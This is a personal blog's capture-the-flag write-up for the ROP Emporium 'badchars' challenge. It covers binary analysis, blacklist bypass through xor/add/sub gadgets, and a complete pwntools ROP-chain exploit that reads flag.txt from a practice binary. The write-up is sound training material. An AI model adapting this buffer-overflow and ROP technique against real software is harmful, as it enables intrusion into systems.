
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="HandheldFriendly" content="True" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="robots" content="noindex" />

  <!--  <link rel="manifest" href="/assets/site.webmanifest" crossorigin="use-credentials">-->

  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">

    <link rel="stylesheet" type="text/css" href="http://localhost:1337/theme/stylesheet/style.min.css">

    <link id="dark-theme-style" rel="stylesheet" type="text/css"
          media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
    href="http://localhost:1337/theme/stylesheet/dark-theme.min.css">

    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
              media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
          href="http://localhost:1337/theme/pygments/monokai.min.css">
    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
              media="(prefers-color-scheme: light)"
          href="http://localhost:1337/theme/pygments/emacs.min.css">


  <link rel="stylesheet"
        type="text/css"
        href="http://localhost:1337/theme/stork/stork.css" />

  <link rel="stylesheet" type="text/css" href="http://localhost:1337/theme/font-awesome/css/fontawesome.css">
  <link rel="stylesheet" type="text/css" href="http://localhost:1337/theme/font-awesome/css/brands.css">
  <link rel="stylesheet" type="text/css" href="http://localhost:1337/theme/font-awesome/css/solid.css">

        <link rel="stylesheet" type="text/css" href="http://localhost:1337/css/custom.css"> 
        <link rel="stylesheet" type="text/css" href="http://localhost:1337/css/zoom.css"> 
        <link rel="stylesheet" type="text/css" href="http://localhost:1337/css/collapsible-toc.css"> 
        <link rel="stylesheet" type="text/css" href="http://localhost:1337/css/goals.css"> 


      <script src="https://code.jquery.com/jquery-3.7.1.min.js" type="application/javascript"></script>
      <script src="https://cdn.jsdelivr.net/npm/dompurify@3.2.4/dist/purify.min.js" type="application/javascript"></script>
      <script src="http://localhost:1337/js/collapsible-toc.js" type="application/javascript"></script>
      <script src="http://localhost:1337/js/zoom.js" type="application/javascript"></script>
      <script src="http://localhost:1337/js/app.js" type="application/javascript"></script>
      <script src="http://localhost:1337/js/goals.js" type="application/javascript"></script>











 

<meta name="author" content="Jack69" />
<meta name="description" content="Running checksec against the binary: &gt; checksec badchars ...  Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)    RUNPATH:  b&#39;.&#39; List badchars symbols: &gt; nm badchars ... 0000000000400607 T main ... 0000000000400617 t usefulFunction 0000000000400628 t usefulGadgets List libbadchars.so symbols: &gt; nm libbadchars.so ... 0000000000000aa0 R badcharacters ... 0000000000000a07 …" />
<meta name="keywords" content="">


  <meta property="og:site_name" content="Jack's Corner"/>
  <meta property="og:title" content="ROP Emporium - badchars"/>
  <meta property="og:description" content="Running checksec against the binary: &gt; checksec badchars ...  Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)    RUNPATH:  b&#39;.&#39; List badchars symbols: &gt; nm badchars ... 0000000000400607 T main ... 0000000000400617 t usefulFunction 0000000000400628 t usefulGadgets List libbadchars.so symbols: &gt; nm libbadchars.so ... 0000000000000aa0 R badcharacters ... 0000000000000a07 …"/>
  <meta property="og:locale" content="en_US"/>
  <meta property="og:url" content="http://localhost:1337/binary-exploitation/rop-emporium/badchars.html"/>
  <meta property="og:type" content="article"/>
  <meta property="article:published_time" content="2024-03-23 18:00:00+01:00"/>
  <meta property="article:modified_time" content=""/>
  <meta property="article:author" content="http://localhost:1337/author/jack69.html">
  <meta property="article:section" content="Binary Exploitation"/>
  <meta property="og:image" content="">

  <title>Jack's Corner &ndash; ROP Emporium - badchars</title>


</head>
<body >

<aside>
  <div>
    <a href="http://localhost:1337/">
      <img src="http://localhost:1337/theme/img/profile.png" alt="Jack's Corner" title="Jack's Corner">
    </a>

    <h1>
      <a href="http://localhost:1337/">Jack's Corner</a>
    </h1>


    <div class="stork">
        <input class="stork-input" type="text" autocomplete="off" name="q" data-stork="sitesearch" placeholder="Search..." onclick=""/>
      <div class="stork-output" data-stork="sitesearch-output"></div>
    </div>


    <ul class="social">
      <li>
        <a class="sc-htb"
           href="https://app.hackthebox.com/profile/177323"
           target="_blank">
          <i class="fa-brands fa-htb"></i>
        </a>
      </li>
      <li>
        <a class="sc-thm"
           href="https://tryhackme.com/p/jack69"
           target="_blank">
          <i class="fa-brands fa-thm"></i>
        </a>
      </li>
    </ul>
  </div>
</aside>
  <main>

<nav>
  <a href="http://localhost:1337/">Home</a>

  <a href="/categories.html">Categories</a>
  <a href="/category/cheatsheet.html">Cheatsheets</a>
  <a href="/personal/goals.html">Goals</a>


</nav>

<article class="single">
  <header>
      
    <h1 id="binary-exploitation/rop-emporium/badchars">ROP Emporium - badchars</h1>
    <p>

    </p>
  </header>


  <div>
    <p>Running checksec against the binary:</p>
<blockquote>
<p>&gt; checksec badchars<br/>
...<br/>
&nbsp;Arch: &nbsp;&nbsp;&nbsp;&nbsp;amd64-64-little<br/>
&nbsp;&nbsp;&nbsp;RELRO: &nbsp;&nbsp;&nbsp;Partial RELRO<br/>
&nbsp;&nbsp;&nbsp;Stack: &nbsp;&nbsp;&nbsp;No canary found  <br/>
&nbsp;&nbsp;&nbsp;NX: &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NX enabled  <br/>
&nbsp;&nbsp;&nbsp;PIE: &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;No PIE (0x400000) <br/>
&nbsp;&nbsp;&nbsp;RUNPATH: &nbsp;b'.'  </p>
</blockquote>
<p>List <em>badchars</em> symbols:</p>
<blockquote>
<p>&gt; nm badchars<br/>
...<br/>
0000000000400607 T main  <br/>
...<br/>
0000000000400617 t usefulFunction <br/>
0000000000400628 t usefulGadgets  </p>
</blockquote>
<p>List <em>libbadchars.so</em> symbols:</p>
<blockquote>
<p>&gt; nm libbadchars.so<br/>
...<br/>
0000000000000aa0 <strong>R</strong> badcharacters<br/>
...<br/>
0000000000000a07 T print_file<br/>
...<br/>
0000000000008fa T pwnme
...  </p>
</blockquote>
<p>Note: <strong>R</strong> stands for read-only data section</p>
<p>Analyse the elf with radare2:</p>
<blockquote>
<p>&gt; radare2 badchars<br/>
aaa  </p>
</blockquote>
<p>Locate writable memory area:</p>
<blockquote>
<p>&gt; om  <br/>
4 fd: 5 +0x00000000 0x00100000 - 0x001effff rw- mem.0x100000_0xf0000  <br/>
3 fd: 3 +0x00000000 0x00400000 - 0x00400837 r-x fmap.LOAD0  <br/>
2 fd: 3 +0x00000df0 0x00600df0 - 0x00601037 r-- fmap.LOAD1 <br/>
1 fd: 4 +0x00000000 0x00601038 - 0x0060103f rw- mmap.LOAD1  </p>
</blockquote>
<p>The <em>libbadchars.so</em> <code>pwnme</code> function applies a transformation to some blacklisted chars:</p>
<ul>
<li>'x', 'g', 'a', '.'</li>
</ul>
<p>This is confirmed by running the program with gdb and analyzing the stack after the pwnme function:</p>
<ul>
<li>the input "flag.txt" gets transformed to "fl&euml;&euml;&euml;t&euml;t"</li>
</ul>
<p>To bypass this blacklist, the <em>usefulGadgets</em> came in help. Following gadgets contained in <em>usefulGadgets</em> :</p>
<blockquote>
<p>&gt; s loc.usefulGadgets
&gt; pd 12<br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;-- usefulGadgets:<br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x00400628 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;453037 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xor byte [r15], r14b<br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x0040062b &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;c3 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ret  <br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x0040062c &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;450037 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add byte [r15], r14b<br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x0040062f &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;c3 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ret<br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x00400630 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;452837 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub byte [r15], r14b<br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x00400633 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;c3 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ret<br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x00400634 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4d896500 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov qword [r13], r12 <br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x00400638 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;c3 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ret <br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x00400639 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0f1f80000000. &nbsp;nop dword [rax]<br/>
&nbsp;&nbsp;
There are three possible alternatives to bypass the blacklist:</p>
</blockquote>
<ul>
<li>Using the <code>xor</code> gadget</li>
<li>Using the <code>add</code> gadget</li>
<li>Using the <code>sub</code> gadget</li>
</ul>
<p>The hex representation for the string "flag.txt" is <code>0x66 0x6c 0x61 0x67 0x2e 0x74 0x78 0x74</code>.</p>
<p><strong>Using <code>xor</code> Gadget</strong></p>
<p>Provide as input the string "flzzztzt" which XOR-ed with the key <code>0x0 0x0 0x1b 0x1d 0x54 0x0 0x2 0x0</code> results in "flag.txt".</p>
<p><strong>Using <code>add</code> Gadget</strong></p>
<p>Provide as input the string "fl`f-twt", obtained by subtracting 1 to each banned char hex representation - <code>0x66 0x6c 0x60 0x66 0x2d 0x74 0x77 0x74</code>. The subtracted value will then be restored by the <code>add</code> gadget, adding 1 to each banned char, resulting in "flag.txt".</p>
<p><strong>Using <code>sub</code> Gadget</strong></p>
<p>Provide as input the string "flbh/tyt", obtained by adding 1 to each banned char hex representation - <code>0x66 0x6c 0x62 0x68 0x2f 0x74 0x79 0x74</code>. The added value will then be restored by the <code>sub</code> gadget, subtracting 1 to each banned char, resulting in "flag.txt".</p>
<p>The strategy will be the following:</p>
<ul>
<li>locate a writable area section, use a <code>mov</code> gadget to save the target string somewhere in memory, then use a <code>xor</code>, <code>add</code> or  <code>sub</code> gadget to revert banned chars back and, in the end, use a <code>pop rdi ; ret</code> gadget to pass the string as argument to the <code>print_file</code> function.</li>
</ul>
<p>A useful <code>mov</code> gadget is found:</p>
<blockquote>
<p>&gt; ROPgadget --binary badchars &nbsp;| grep &nbsp;-iE 'mov'<br/>
...<br/>
0x0000000000400634 : mov qword ptr [r13], r12 ; ret <br/>
...  </p>
</blockquote>
<p>Some other handy gadgets found are the following:</p>
<blockquote>
<p>&gt; ROPgadget --binary badchars &nbsp;| grep &nbsp;-iE 'pop.*r12'<br/>
...<br/>
0x000000000040069c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret  <br/>
...  </p>
<p>&gt; ROPgadget --binary badchars &nbsp;| grep &nbsp;-iE 'pop r14'<br/>
...<br/>
0x00000000004006a0 : pop r14 ; pop r15 ; ret  <br/>
...  </p>
</blockquote>
<p>The ROP chain will resemble something like this:</p>
<ul>
<li><code>pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</code> +</li>
<li>target string +</li>
<li>writable address +</li>
<li><code>0x1b</code> if using <code>xor</code> gadget or <code>1</code> if using <code>add</code>/<code>sub</code> gadget +</li>
<li>3rd char address (writable address + 2) +</li>
<li><code>mov qword ptr [r13], r12 ; ret</code> +</li>
<li><code>xor byte [r15], r14b</code> or <code>add byte [r15], r14b</code> or <code>sub byte [r15], r14b</code> +</li>
<li><code>pop r14 ; pop r15 ; ret</code> +</li>
<li><code>0x1d</code> if using <code>xor</code> gadget or <code>1</code> if using <code>add</code>/<code>sub</code> gadget +</li>
<li>4th char address (writable address + 3) +</li>
<li><code>xor byte [r15], r14b</code> or <code>add byte [r15], r14b</code> or <code>sub byte [r15], r14b</code> +</li>
<li><code>pop r14 ; pop r15 ; ret</code> +</li>
<li><code>0x54</code> if using <code>xor</code> gadget or <code>1</code> if using <code>add</code>/<code>sub</code> gadget +</li>
<li>5th char address (writable address + 4) +</li>
<li><code>xor byte [r15], r14b</code> or <code>add byte [r15], r14b</code> or <code>sub byte [r15], r14b</code> +-</li>
<li><code>pop r14 ; pop r15 ; ret</code> +</li>
<li><code>0x2</code> if using <code>xor</code> gadget or <code>1</code> if using <code>add</code>/<code>sub</code> gadget +</li>
<li>7th char address (writable address + 6) +</li>
<li><code>xor byte [r15], r14b</code> or <code>add byte [r15], r14b</code> or <code>sub byte [r15], r14b</code> +</li>
<li><code>pop rdi ; ret</code> +</li>
<li>writable address +</li>
<li><code>print_file</code> address</li>
</ul>
<p>The complete pwntools solution is the following:</p>
<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="n">solution</span> <span class="o">=</span> <span class="s1">'xor'</span> <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span> <span class="k">else</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>

<span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="s1">'./badchars'</span><span class="p">)</span>
<span class="n">ropper</span> <span class="o">=</span> <span class="n">rop</span><span class="o">.</span><span class="n">ROP</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">'./badchars'</span><span class="p">)</span> <span class="c1"># type: pwnlib.tubes.process.process</span>
<span class="c1">#gdb_init = '''</span>
<span class="c1">#b pwnme</span>
<span class="c1">#continue</span>
<span class="c1">#'''</span>
<span class="c1">#p = gdb.debug('./badchars', gdb_init) # type: pwnlib.tubes.process.process</span>

<span class="n">offset</span> <span class="o">=</span> <span class="mi">40</span>
<span class="n">pop_r14_r15_gadget</span> <span class="o">=</span> <span class="n">ropper</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s1">'pop r14'</span><span class="p">,</span><span class="s1">'pop r15'</span><span class="p">,</span><span class="s1">'ret'</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
<span class="n">pop_r12_r13_r14_r15_gadget</span> <span class="o">=</span> <span class="n">ropper</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s1">'pop r12'</span><span class="p">,</span> <span class="s1">'pop r13'</span> <span class="p">,</span><span class="s1">'pop r14'</span><span class="p">,</span><span class="s1">'pop r15'</span><span class="p">,</span><span class="s1">'ret'</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
<span class="n">xor_gadget</span> <span class="o">=</span> <span class="n">binary</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'usefulGadgets'</span><span class="p">]</span> <span class="c1"># &nbsp;xor byte [r15], r14b ; ret</span>
<span class="n">add_gadget</span> <span class="o">=</span> <span class="n">binary</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'usefulGadgets'</span><span class="p">]</span> <span class="o">+</span> <span class="mi">4</span> <span class="c1"># add byte [r15], r14b ; ret</span>
<span class="n">sub_gadget</span> <span class="o">=</span> <span class="n">binary</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'usefulGadgets'</span><span class="p">]</span> <span class="o">+</span> <span class="mi">8</span> <span class="c1"># sub byte [r15], r14b ; ret</span>
<span class="n">mov_gadget</span> <span class="o">=</span> <span class="n">binary</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'usefulGadgets'</span><span class="p">]</span> <span class="o">+</span> <span class="mi">12</span> <span class="c1"># mov qword [r13], r12 ; ret</span>

<span class="n">pop_rdi_gadget</span> <span class="o">=</span> <span class="n">ropper</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s1">'pop rdi'</span><span class="p">,</span> <span class="s1">'ret'</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>

<span class="n">print_file_plt</span> <span class="o">=</span> <span class="n">binary</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">'print_file'</span><span class="p">]</span>
<span class="n">writable_address</span> <span class="o">=</span> <span class="mh">0x601040</span>

<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"pop r14-r15 gadget address: 0x</span><span class="si">{</span><span class="n">pop_r14_r15_gadget</span><span class="si">:</span><span class="s2">2x</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"pop r12-r13-r14-r15 gadget address: 0x</span><span class="si">{</span><span class="n">pop_r12_r13_r14_r15_gadget</span><span class="si">:</span><span class="s2">2x</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"xor gadget address: 0x</span><span class="si">{</span><span class="n">xor_gadget</span><span class="si">:</span><span class="s2">2x</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"add gadget address: 0x</span><span class="si">{</span><span class="n">add_gadget</span><span class="si">:</span><span class="s2">2x</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"sub gadget address: 0x</span><span class="si">{</span><span class="n">sub_gadget</span><span class="si">:</span><span class="s2">2x</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"mov gadget address: 0x</span><span class="si">{</span><span class="n">mov_gadget</span><span class="si">:</span><span class="s2">2x</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"pop rdi ; ret gadget address: 0x</span><span class="si">{</span><span class="n">pop_rdi_gadget</span><span class="si">:</span><span class="s2">2x</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"print_file PLT address: 0x</span><span class="si">{</span><span class="n">print_file_plt</span><span class="si">:</span><span class="s2">2x</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"writable_address @: 0x</span><span class="si">{</span><span class="n">writable_address</span><span class="si">:</span><span class="s2">2x</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"&gt; "</span><span class="p">)</span>

<span class="k">if</span> <span class="n">solution</span> <span class="o">==</span> <span class="s2">"xor"</span><span class="p">:</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">"XOR Solution"</span><span class="p">)</span>
    <span class="n">operation_gadget</span> <span class="o">=</span> <span class="n">xor_gadget</span>
    <span class="n">input_string</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"flzzztzt"</span>
    <span class="n">value1</span> <span class="o">=</span> <span class="mh">0x1b</span>
    <span class="n">value2</span> <span class="o">=</span> <span class="mh">0x1d</span>
    <span class="n">value3</span> <span class="o">=</span> <span class="mh">0x54</span>
    <span class="n">value4</span> <span class="o">=</span> <span class="mh">0x2</span>
<span class="k">elif</span> <span class="n">solution</span> <span class="o">==</span> <span class="s2">"add"</span><span class="p">:</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">"ADD Solution"</span><span class="p">)</span>
    <span class="n">operation_gadget</span> <span class="o">=</span> <span class="n">add_gadget</span>
    <span class="n">input_string</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"fl`f-twt"</span>
    <span class="n">value1</span> <span class="o">=</span> <span class="n">value2</span> <span class="o">=</span> <span class="n">value3</span> <span class="o">=</span> <span class="n">value4</span> <span class="o">=</span> <span class="mi">1</span>
<span class="k">else</span><span class="p">:</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">"SUB Solution"</span><span class="p">)</span>
    <span class="n">operation_gadget</span> <span class="o">=</span> <span class="n">sub_gadget</span>
    <span class="n">input_string</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"flbh/tyt"</span>
    <span class="n">value1</span> <span class="o">=</span> <span class="n">value2</span> <span class="o">=</span> <span class="n">value3</span> <span class="o">=</span> <span class="n">value4</span> <span class="o">=</span> <span class="mi">1</span>

<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">"A"</span> <span class="o">*</span> <span class="n">offset</span> <span class="o">+</span>  
      <span class="n">p64</span><span class="p">(</span><span class="n">pop_r12_r13_r14_r15_gadget</span><span class="p">)</span> <span class="o">+</span> 
      <span class="n">input_string</span> <span class="o">+</span> 
      <span class="n">p64</span><span class="p">(</span><span class="n">writable_address</span><span class="p">)</span> <span class="o">+</span>
      <span class="n">p64</span><span class="p">(</span><span class="n">value1</span><span class="p">)</span> <span class="o">+</span>
      <span class="n">p64</span><span class="p">(</span><span class="n">writable_address</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="o">+</span> 
      <span class="n">p64</span><span class="p">(</span><span class="n">mov_gadget</span><span class="p">)</span> <span class="o">+</span>
      <span class="n">p64</span><span class="p">(</span><span class="n">operation_gadget</span><span class="p">)</span> <span class="o">+</span> 
      <span class="n">p64</span><span class="p">(</span><span class="n">pop_r14_r15_gadget</span><span class="p">)</span> <span class="o">+</span>
      <span class="n">p64</span><span class="p">(</span><span class="n">value2</span><span class="p">)</span> <span class="o">+</span>
      <span class="n">p64</span><span class="p">(</span><span class="n">writable_address</span> <span class="o">+</span> <span class="mi">3</span><span class="p">)</span> <span class="o">+</span> 
      <span class="n">p64</span><span class="p">(</span><span class="n">operation_gadget</span><span class="p">)</span> <span class="o">+</span> 
      <span class="n">p64</span><span class="p">(</span><span class="n">pop_r14_r15_gadget</span><span class="p">)</span> <span class="o">+</span>
      <span class="n">p64</span><span class="p">(</span><span class="n">value3</span><span class="p">)</span> <span class="o">+</span>
      <span class="n">p64</span><span class="p">(</span><span class="n">writable_address</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">+</span> 
      <span class="n">p64</span><span class="p">(</span><span class="n">operation_gadget</span><span class="p">)</span> <span class="o">+</span> 
      <span class="n">p64</span><span class="p">(</span><span class="n">pop_r14_r15_gadget</span><span class="p">)</span> <span class="o">+</span>
      <span class="n">p64</span><span class="p">(</span><span class="n">value4</span><span class="p">)</span> <span class="o">+</span>
      <span class="n">p64</span><span class="p">(</span><span class="n">writable_address</span> <span class="o">+</span> <span class="mi">6</span><span class="p">)</span> <span class="o">+</span>
      <span class="n">p64</span><span class="p">(</span><span class="n">operation_gadget</span><span class="p">)</span> <span class="o">+</span> 
      <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_gadget</span><span class="p">)</span> <span class="o">+</span> 
      <span class="n">p64</span><span class="p">(</span><span class="n">writable_address</span><span class="p">)</span> <span class="o">+</span> 
      <span class="n">p64</span><span class="p">(</span><span class="n">print_file_plt</span><span class="p">))</span>

<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div>
  </div>
  <div class="tag-cloud">
    <p>
    </p>
  </div>






</article>

<footer>
<p>&copy; Jack69 - 2025 </p>
<p>
Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
  <span class="footer-separator">|</span>
  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
  <script id="dark-theme-script"
          src="http://localhost:1337/theme/dark-theme/dark-theme.min.js"
          data-enable-auto-detect-theme="True"
          data-default-theme="dark"
          type="text/javascript">
  </script>
</p></footer>  </main>

<script type="application/ld+json">
{
  "@context" : "http://schema.org",
  "@type" : "Blog",
  "name": " Jack's Corner ",
  "url" : "http://localhost:1337",
  "image": "",
  "description": "My personal notes on stuff I like, nothing special"
}
</script>  <script>
    window.loadStorkIndex = function () {
      stork.initialize("http://localhost:1337/theme/stork/stork.wasm")
      stork.register("sitesearch", "http://localhost:1337/search-index.st", { showProgress: false });
    }
  </script>
  <script src="http://localhost:1337/theme/stork/stork.js"></script>

</body>
</html>